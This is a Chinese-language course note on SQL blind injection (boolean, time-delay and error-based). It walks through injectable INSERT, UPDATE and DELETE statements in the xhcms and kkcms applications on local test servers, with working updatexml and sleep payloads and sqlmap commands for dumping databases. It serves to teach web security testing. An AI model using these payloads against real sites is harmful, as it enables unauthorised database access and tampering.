![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135676230-fffc28e5-eec4-482b-9fed-1197e5e04fa6.png)

```plain
#知识点：
1、明确查询方式注入Payload
2、明确查询方式注入产生功能
3、明确SQL盲注延时&布尔&报错

#详细点：
盲注就是在注入过程中，获取的数据不能回显至前端页面。
此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。
解决：常规的联合查询注入不行的情况
我们可以知道盲注分为以下三类：
-基于布尔的SQL盲注-逻辑判断
regexp,like,ascii,left,ord,mid
-基于时间的SQL盲注-延时判断
if,sleep
-基于报错的SQL盲注-报错回显
floor，updatexml，extractvalue
https://www.jianshu.com/p/bc35f8dd4f7c

参考：
like 'ro%'            #判断ro或ro...是否成立 
regexp '^xiaodi[a-z]' #匹配xiaodi及xiaodi...等
if(条件,5,0)           #条件成立 返回5 反之 返回0
sleep(5)              #SQL语句延时执行5秒
mid(a,b,c)            #从位置b开始，截取a字符串的c位
substr(a,b,c)         #从位置b开始，截取字符串a的c长度
left(database(),1)，database() #left(a,b)从左侧截取a的前b位
length(database())=8  #判断数据库database()名的长度
ord=ascii ascii(x)=97 #判断x的ascii码是否等于97

SQL查询方式注入
select,insert,update,delete,orderby等

基本知识本地测试
select * from member where username like 'vi%';
select * from member where username regexp '^x';
select * from member where id=1 and sleep(1);
select * from member where id=1 and if(1>2,sleep(1),0);
select * from member where id=1 and if(1<2,sleep(1),0);
select * from member where id=1 and length(database())=7;
select * from member where id=1 and left(database(),1)='p';
select * from member where id=1 and left(database(),2)='pi';
select * from member where id=1 and substr(database(),1,1)='p';
select * from member where id=1 and substr(database(),2,1)='i';
select * from member where id=1 and ord(left(database(),1))=112;
```

- SQL-盲注&布尔&报错&延时

```plain
#SQL-盲注&布尔&报错&延时
PHP开发项目-输出结果&开启报错
基于延时：都不需要
/blog/news.php?id=1 and if(1=1,sleep(5),0)
基于布尔：有数据库输出判断标准
/blog/news.php?id=1 and length(database())=7
基于报错：有数据库报错处理判断标准
/blog/news.php?id=2 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)

知识点：
1、查询方式增删改查四种特性决定，部分是不需要进行数据取出和显示，所以此类注入基本上需要采用盲注才能正常得到结果（黑盒测试可以根据功能判断注入查询方式）如：增加，删除，更新不会显示数据
2、查询方式增删改查四种特性决定应用功能点（会员注册，删除新闻，修改文章等）
在执行SQL语句后，获取的数据：1.输出显示 2.不输出显示
只是执行了这个语句，并不会显示。
显示代码：
while($row=mysql_fetch_array($result)){
    echo '<br><br><hr>';
    echo $row['id'];
    echo $row['gName'];
    
 如果注释了这个代码，那么他不会进行显示
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135675676-68c7b5fb-7243-4167-962a-9af583a1b8bb.png)

如果没有显示，这个时候就采用盲注来进行攻击

布尔

```plain
布尔盲注：---逻辑判断
函数：regexp,like,ascii,left,ord,mid
判断数据库名字是否为7，判断数据库长度
127.0.0.1:8081/web/mysql/news.php?id=1 and length(database())=1
页面错误
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135675673-2b3acf03-4c11-4efe-b611-cabca6880b52.png)

```plain
如果是正确的数据库长度，127.0.0.1:8081/web/mysql/news.php?id=1 and length(database())=11
页面就正常显示
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135675677-7da23670-670d-4f4b-b3ab-a8e628d70703.png)

报错

```plain
SQL语句在执行的时候，$result=mysql_query($sql,$conn) or die(mysql_error());这样写才可以生效，容错处理。
语句参考：https://www.jianshu.com/p/bc35f8dd4f7c
127.0.0.1:8081/web/mysql/news.php?id=1 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135675675-0fc09f76-2cf9-44be-b9c4-50c8ee0a70e8.png)

延时

```plain
延时盲注：
判断标准：先判断初始化的时间，然后在进行延迟测试判断的时间，两个时间的不同来进行判断是否有延迟
127.0.0.1:8081/web/mysql/news.php?id=1 and if(1=1,sleep(5),0)
一般结合布尔盲注来进行测试，在1=1做文章。
```

判断是否延迟，主要看两个不同数据包的返回包时间差，在burpsuite下的右下角

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135676030-3a1a6ba0-a331-48f8-be51-2afc8556a20c.png)

```plain
可以结合布尔注入来进行测试
127.0.0.1:8081/web/mysql/news.php?id=1 and if(length(database())=5,sleep(5),0)
没有延迟
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135676147-06c94781-6b03-4da7-a22e-49a7526a0464.png)

```plain
127.0.0.1:8081/web/mysql/news.php?id=1 and if(length(database())=11,sleep(5),0)
延迟5秒
根据两个数据包返回不同，就可以判断出数据库的长度为11位。
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135676159-0ded9fad-f826-49ae-b0f6-48b95eb12002.png)

- 查询-select-xhcms-布尔盲注

SELECT column_name,column_name FROM table_name;

- 插入-insert-xhcms-报错盲注

INSERT INTO table_name (列1, 列2,...) VALUES (值1, 值2,....)全局搜索insert关键字，发现关键代码上的文件files/submit.php

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135676133-a88fc5b7-a6dc-4442-b064-116639aee0f6.png)

对应的表interaction

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135676376-a1399695-e6bb-4ec9-b3a4-2b8033d0b61d.png)

```plain
在insert下面发现关键性代码：@mysql_query($query) or die('新增错误：'.mysql_error());
这个时候可以采用报错注入。
那么应该怎么触发这个文件呢？（files/submit.php）
主要看index.php文件。
<?php
//单一入口模式
error_reporting(0); //关闭错误显示
$file=addslashes($_GET['r']); //接收文件名
$action=$file==''?'index':$file; //判断为空或者等于index
include('files/'.$action.'.php'); //载入相应文件
?>

在index.php中，接受r参数，包含一个'files/'.$action.'.php'文件，只要让action=submit就可以触发这个文件。
构造访问地址：127.0.0.1:8087/index.php?r=submit
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135676482-6dcb8292-9fd4-4f25-9f2b-4ffaaa11fba3.png)

出现错误，在进行读files/submit.php代码，发现进行到的代码段

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135676479-2dbeb6d1-e8eb-4a46-b54d-405f2e693477.png)

```plain
我们可以进行自己构造参数来访问，在post自己发送参数。但是这里不需要这样去访问，我们可以测试那个文件调用了这个files/submit.php文件。
访问127.0.0.1:8087/index.php?r=contact地址，一样也可以触发submit文件
查看files/contact.php文件，看提交的数据是给谁。
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135676593-2964dfc9-a086-44eb-9f33-a4805628671f.png)

```plain
那就意味着在这个文件提交的表单，会在files/submit.php文件中处理。
构造payload提交表单：'or updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1) or '
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135676496-9d74646d-c0a7-4c41-8e54-ab96c4894160.png)

```plain
为什么会造成这种注入？

SQL语句执行代码：
$query = "INSERT INTO interaction (
type,
xs,
cid,
name,
mail,
url,
touxiang,
shebei,
ip,
content,
tz,
date
) VALUES (
'$type',
'$xs',
'$cid',
'$name',
'$mail',
'$url',
'$touxiang',
'$shebei',
'$ip',
'$content',
'$tz',
now()
)";
@mysql_query($query) or die('新增错误：'.mysql_error());

提交的payload：'or updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1) or '
即：name='or updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1) or '

代入SQL语句中：
$query = "INSERT INTO interaction (
type,
xs,
cid,
name,
mail,
url,
touxiang,
shebei,
ip,
content,
tz,
date
) VALUES (
'$type',
'$xs',
'$cid',
''or updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1) or '',
'$mail',
'$url',
'$touxiang',
'$shebei',
'$ip',
'$content',
'$tz',
now()
)";
我们在白盒上分析了这个漏洞，那么在黑盒上应该怎么分析呢？
首先观察留言框，然后看他是不是能在数据库上存储，进行SQL执行（insert语句），也可以用sqlmap进行盲注。但是有验证码，（看能不能验证码复用，或者识别验证码）
```

- 更新-update-xhcms-报错盲注

UPDATE table_name SET column1=value1,column2=value2,... WHERE some_column=some_value;搜索关键代码update，发现在files/software.php下面有update SQL执行语句。

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135676694-e623f08b-3b3d-4e7e-943a-db00eed3583c.png)

```plain
参数接收：$id=addslashes($_GET['cid']);
SQL执行：
$query = "UPDATE download SET hit = hit+1 WHERE id=$id";
@mysql_query($query) or die('修改错误：'.mysql_error());
```

直接访问触发地址：127.0.0.1:8087/index.php?r=software&cid=1 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135676748-11aff0b1-3827-4923-bebd-c75e2a58e5cd.png)

```plain
那么在黑盒中应该怎么分析？
查看哪里调用了software文件（全局搜索），发现在submit中有调用software
调用代码：
if ($type=='download'){
$fhlink="/?r=software&cid=".$cid;
$fhname="软件评论";
$type=3;
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135676834-c14d154b-b668-4c2b-ac14-6413520e3a1c.png)

全局搜索submit调用，type类型为download的调用地方，在页面中应该是下载评论的地方，http://127.0.0.1:8087/index.php?r=software&cid=1

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135677040-fee7d308-1d03-47d2-b8db-a3084c1a4bf8.png)

测试    http://127.0.0.1:8087/index.php?r=software&cid=1    cid的值

- 删除-delete-kkcms-延时盲注

DELETE FROM 表名称 WHERE 列名称 = 值

```plain
全局搜索delete 发现文件admin/model/usergroup.php
这个注入点是在后台的。
那么应该怎么样触发admin/model/usergroup.php呢
如果直接访问admin/moder/usergroup.php，那肯定是有问题的。
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135676849-bc095f12-32bd-42fa-9538-4c8be7092b37.png)

```plain
没有数据库报错函数，这时候只能采用延迟布尔注入
如果直接访问文件：
http://127.0.0.1:8099/admin/model/usergroup.php?del=2 and if(1=1,sleep(5),0)
结合SQL语句：delete from xtcms_user_group where ug_id = 2 and if(1=1,sleep(5),0)
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135677203-be86fa65-e1c0-4b09-b2aa-66737ab6ab30.png)

```plain
可以看到页面执行没有延迟，修改一下注入语句delete from xtcms_user_group where ug_id = 2 or if(1=1,sleep(5),0)
放在数据库中执行
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135677107-0b8e47c1-001a-4a04-ac49-f71b2af5b7c4.png)

```plain
发现SQL执行延迟了。构造一下payload：http://127.0.0.1:8099/admin/model/usergroup.php?del=2 or if(1=1,sleep(5),0)
但是页面没有延迟。
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135677164-d1bbc8b9-1028-44f2-a77c-72c87ae42854.png)

```plain
结合SQL监控插件，发现SQL语句根本没有执行。因为直接访问这个文件出了问题
结合包含文件查找，admin/cms_usergroup.php调用了admin/model/usergroup.php文件。
构造：127.0.0.1:8099/admin/cms_usergroup.php?del=2 or if(1=1,sleep(5),0)
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135677287-172ca80d-feb5-4d96-8f5f-e1b84af20c58.png)

```plain
里面还有转义，可以用宽字节或者ASCII码来进行注入。
可以用sqlmap去跑。用到数据包进行注入。（因为有cookie）
python310 sqlmap.py -r 1.txt
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135677441-fc187ffc-7b32-4449-9d68-8cade68d0e6f.png)

```plain
猜解数据：python310 sqlmap.py -r 1.txt --dbs
--dbs --tables --coulmns进行数据库的猜解。
查看sqlmap的payload可以加上-v 5
```

![img](https://cdn.nlark.com/yuque/0/2024/png/1591503/1721135677528-10b57f0d-53db-4516-b9ab-513d3a2f72a7.png)